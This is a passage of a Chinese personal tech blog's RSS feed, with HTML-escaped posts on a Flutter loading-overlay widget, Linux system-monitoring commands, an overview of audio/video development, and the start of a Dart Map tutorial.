  ProgressDialog&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;Key key&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;@required&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;loading&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;@required&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;child&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;child &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loading &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;key&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; key&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;

  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    List&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; widgetList &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[];&lt;/span&gt;
    widgetList&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;child&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;//如果正在加载，则显示加载添加加载中布局
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loading&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;//增加一层黑色背景透明度为0.8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      widgetList&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        Opacity&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
            opacity&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
            child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; ModalBarrier&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
              color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Colors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;black87&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;)),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;//环形进度条
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      widgetList&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Center&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; CircularProgressIndicator&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Stack&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
      children&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; widgetList&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—系统监控命令</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7%E5%91%BD%E4%BB%A4/</link>
        <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7%E5%91%BD%E4%BB%A4/</guid>
        <description>&lt;h2 id=&#34;1top--进程活动监控命令&#34;&gt;1.top – 进程活动监控命令&lt;/h2&gt;
&lt;p&gt;top 命令会显示 Linux 的进程。它提供了一个运行中系统的实时动态视图，即实际的进程活动。默认情况下，它显示在服务器上运行的 CPU 占用率最高的任务，并且每五秒更新一次。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;t	是否显示汇总信息
m	是否显示内存信息
A	根据各种系统资源的利用率对进程进行排序，有助于快速识别系统中性能不佳的任务。
f	进入 top 的交互式配置屏幕，用于根据特定的需求而设置 top 的显示。
o	交互式地调整 top 每一列的顺序。
r	调整优先级（renice）
k	杀掉进程（kill）
z	切换彩色或黑白模式
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2w--找出登录用户&#34;&gt;2.w – 找出登录用户&lt;/h2&gt;
&lt;p&gt;w 命令 显示了当前登录在该系统上的用户及其进程。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# w username
# w vivek
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3uptime--系统运行时间&#34;&gt;3.uptime – 系统运行时间&lt;/h2&gt;
&lt;p&gt;uptime 命令可以用来查看服务器运行了多长时间：当前时间、已运行的时间、当前登录的用户连接数，以及过去 1 分钟、5 分钟和 15 分钟的系统负载平均值，1 可以被认为是最佳负载值。&lt;/p&gt;
&lt;h2 id=&#34;4ps--显示系统进程&#34;&gt;4.ps – 显示系统进程&lt;/h2&gt;
&lt;p&gt;ps 命令显示当前运行的进程。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# ps -A       |显示所有的进程
# ps -Al      |显示长输出格式
# ps -AlF     |显示完整输出格式（它将显示传递给进程的命令行参数）
# ps -AlFH    |显示线程（轻量级进程（LWP）和线程的数量（NLWP））
# ps -AlLm    |在进程后显示线程
# ps ax# ps axu       |显示系统上所有的进程
# pstree              |显示进程树
# ps -U vivek -u vivek u        |显示指定用户（如 vivek）运行的进程
# # ps -C lighttpd -o pid=      |显示某进程（如 lighttpd）的 PID
# ps -p 55977 -o comm=          |显示指定 PID（如 55977）的进程名称
# ps -auxf | sort -nr -k 4 | head -10     |找出占用内存资源最多的前10个进程
# ps -auxf | sort -nr -k 3 | head -10     |找出占用CPU资源最多的前10个进程
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5free--内存使用情况&#34;&gt;5.free – 内存使用情况&lt;/h2&gt;
&lt;p&gt;free 命令显示了系统的可用和已用的物理内存及交换内存的总量，以及内核用到的缓存空间。&lt;/p&gt;
&lt;h2 id=&#34;6iostat--cpu-平均负载和磁盘活动&#34;&gt;6.iostat – CPU 平均负载和磁盘活动&lt;/h2&gt;
&lt;p&gt;iostat 命令用于汇报 CPU 的使用情况，以及设备、分区和网络文件系统（NFS）的 IO 统计信息。&lt;/p&gt;
&lt;h2 id=&#34;7sar--监控收集和汇报系统活动&#34;&gt;7.sar – 监控、收集和汇报系统活动&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sar&lt;/code&gt; 命令用于收集、汇报和保存系统活动信息。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# sar -n DEV | more       |查看网络统计
# sar -n DEV -f /var/log/sa/sa24 | more        |显示 24 日的网络统计
# sar 4 5         |显示实时使用情况
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;8-mpstat--监控多处理器的使用情况&#34;&gt;8. mpstat – 监控多处理器的使用情况&lt;/h2&gt;
&lt;p&gt;mpstat 命令显示每个可用处理器的使用情况，编号从 0 开始。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# mpstat -P ALL   |显示每个处理器的平均使用率
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;9pmap--监控进程的内存使用情况&#34;&gt;9.pmap – 监控进程的内存使用情况&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;pmap&lt;/code&gt; 命令用以显示进程的内存映射，使用此命令可以查找内存瓶颈。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# pmap -d PID   |显示 PID 进程的内存信息
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意输出的最后一行，mapped: 933712K 表示映射到文件的内存量 ，writeable/private: 4304K 表示私有地址空间，shared: 768000K 表示此进程与其他进程共享的地址空间&lt;/p&gt;
&lt;h2 id=&#34;10netstat--网络统计监控工具&#34;&gt;10.netstat – 网络统计监控工具&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;netstat&lt;/code&gt; 命令显示网络连接、路由表、接口统计、伪装连接和多播连接等信息。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# netstat -tulpn
# netstat -nat
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;11ss--网络统计&#34;&gt;11.ss – 网络统计&lt;/h2&gt;
&lt;p&gt;ss 命令用于获取套接字统计信息。它可以显示类似于 netstat 的信息。不过 netstat 几乎要过时了，ss 命令更具优势。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# ss -t -a   |显示所有 TCP 或 UDP 套接字
# ss -u -a
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;12环境配置&#34;&gt;12.环境配置&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vim /etc/profile #编辑vi
source /etc/profile #启用环境 配置后启动环境
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—音视频的技术</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E9%9F%B3%E8%A7%86%E9%A2%91%E7%9A%84%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E9%9F%B3%E8%A7%86%E9%A2%91%E7%9A%84%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/dev_csdn/article/details/78738806&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 从开发小白到音视频专家  @卢俊 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;音视频开发，就是要掌握图像、音频、视频的基础知识，并且学会如何对它们进行采集、渲染、处理、传输等一系列的开发和应用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;采集：它解决的是，数据从哪里来的问题&lt;/li&gt;
&lt;li&gt;渲染：它解决的是，数据怎么展现的问题&lt;/li&gt;
&lt;li&gt;处理：它解决的是，数据怎么加工的问题&lt;/li&gt;
&lt;li&gt;传输：它解决的是，数据怎么共享的问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每一个门类，都可以深挖，衍生出一个又一个充满技术挑战的话题，比如：如何更高效地渲染画面、如何提高音视频的压缩比，如何优化弱网下的音视频数据传输等等。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291733743.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291733743.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;1采集&#34;&gt;1.采集&lt;/h2&gt;
&lt;p&gt;采集，它解决的是，数据从哪里来的问题，那么，数据究竟从哪里来的呢 ？&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291733524.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291733524.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其实无论在哪个平台，图像、视频最初都是来自摄像头，而音频最初都是来自麦克风，因此，做音视频采集，就要掌握如下的技术知识：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;系统的摄像头采集接口是什么，怎么用？比如：Windows：DirectShow，Linux：V4L2，Android：Camera，iOS：AVCaptureSession&lt;/li&gt;
&lt;li&gt;系统的摄像头采集的参数怎么配置，都是什么含义 ？比如：分辨率、帧率、预览方向、对焦、闪光灯 等&lt;/li&gt;
&lt;li&gt;系统的摄像头输出的图像/视频数据，是什么格式，不同格式有什么区别 ？比如：图片：JPEG；视频数据：NV21，NV12，I420 等&lt;/li&gt;
&lt;li&gt;系统的麦克风采集接口是什么，怎么用 ？比如：Windows：DirectShow，Linux：ALSA &amp;amp; OSS，Android：AudioRecord，iOS：Audio Unit&lt;/li&gt;
&lt;li&gt;系统的麦克风采集参数怎么配置，都是什么含义 ？比如：采样率、通道号、位宽等&lt;/li&gt;
&lt;li&gt;系统的麦克风输出的音频数据，是什么格式？比如：PCM&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2渲染&#34;&gt;2.渲染&lt;/h2&gt;
&lt;p&gt;渲染，它解决的是，数据怎么展现的问题，那么，数据究竟怎么展现呢 ？&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291733746.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291733746.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其实无论在哪个平台，图像、视频最终都是要绘制到视图上面，而音频最终都是要输出到扬声器，因此，做音视频渲染，就要掌握如下的技术知识：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;系统提供了哪些 API 可以绘制一张图片或者一帧 YUV 图像数据的 ？比如：Windows：DirectDraw, Direct3D, GDI，OpenGL 等，Linux： GDI， OpenGL 等，Android：ImageView，SurfaceView，TextureView，OpenGL 等，iOS： CoreGraphics，OpenGL 等&lt;/li&gt;
&lt;li&gt;系统提供了哪些 API 可以播放一个 mp3 或者 pcm 数据 ？比如：Windows：DirectSound 等，Linux：ALSA &amp;amp; OSS 等，Android：AudioTrack 等，iOS： AudioQueue 等&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;3处理&#34;&gt;3.处理&lt;/h2&gt;
&lt;p&gt;处理，它解决的是，数据怎么加工的问题，那么，数据究竟可以怎么加工呢 ？首先，我们看看图像/音视频的数据可以做哪些加工 ？&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291733566.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291733566.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其实无论在哪个平台，图像和音视频的加工，除了系统的 API，大多数都会依赖一些跨平台的第三方库的，通过掌握这些第三方库的原理和使用方法，基本上就可以满足日常音视频处理工作了，这些库包括但不限于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;图像处理：OpenGL，OpenCV，libyuv，ffmpeg 等&lt;/li&gt;
&lt;li&gt;视频编解码：x264，OpenH264，ffmpeg 等&lt;/li&gt;
&lt;li&gt;音频处理：speexdsp，ffmpeg 等&lt;/li&gt;
&lt;li&gt;音频编解码：libfaac，opus，speex，ffmpeg 等&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;4传输&#34;&gt;4.传输&lt;/h2&gt;
&lt;p&gt;传输，它解决的是，数据怎么共享的问题，那么，数据究竟怎么共享呢 ？&lt;/p&gt;
&lt;p&gt;**共享，最重要的一点，就是协议。**无论什么数据，要想在不同的国家、不同设备之间互联互通，离不开 “标准”，有了 “标准”，大家就能互相读懂对方。因此，研究音视频传输，其实就是在研究协议，具体有哪些协议呢 ？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;音视频在传输前，怎么打包的，如：FLV，ts，mpeg4 等&lt;/li&gt;
&lt;li&gt;直播推流，有哪些常见的协议，如：RTMP，RSTP 等&lt;/li&gt;
&lt;li&gt;直播拉流，有哪些常见的协议，如：RTMP，HLS，HDL，RTSP 等&lt;/li&gt;
&lt;li&gt;基于 UDP 的协议有哪些？如：RTP/RTCP，QUIC 等&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Dart—字典</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E5%AD%97%E5%85%B8/</link>
        <pubDate>Wed, 28 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E5%AD%97%E5%85%B8/</guid>
        <description>&lt;h2 id=&#34;1声明&#34;&gt;1.声明&lt;/h2&gt;
&lt;h3 id=&#34;a不指定泛型&#34;&gt;a.不指定泛型&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//直接赋值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; map1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aa&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cc&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;}; 
    Map map2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b1&amp;#39;&lt;/span&gt;};  
&lt;span style=&#34;color:#75715e&#34;&gt;//间接赋值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; map3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Map(); 
    map3[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aa&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa&amp;#39;&lt;/span&gt;; 
    Map map4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Map(); 
    map4[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b指定泛型&#34;&gt;b.指定泛型&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//直接赋值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; map1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aa&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;22&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cc&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;333&amp;#39;&lt;/span&gt;};
    Map map2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c1&amp;#39;&lt;/span&gt;};
    
&lt;span style=&#34;color:#75715e&#34;&gt;//间接赋值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; map3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;();
    map3[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aa&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa&amp;#39;&lt;/span&gt;;
    Map map4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;();
    map4[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a1&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c复制&#34;&gt;c.复制&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 不使用类型操作符,从另一个map中初始化新的map，此时新的map中含有另一个map中的资源
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map map1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c1&amp;#39;&lt;/span&gt;};
    Map map2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Map.castFrom(map1);

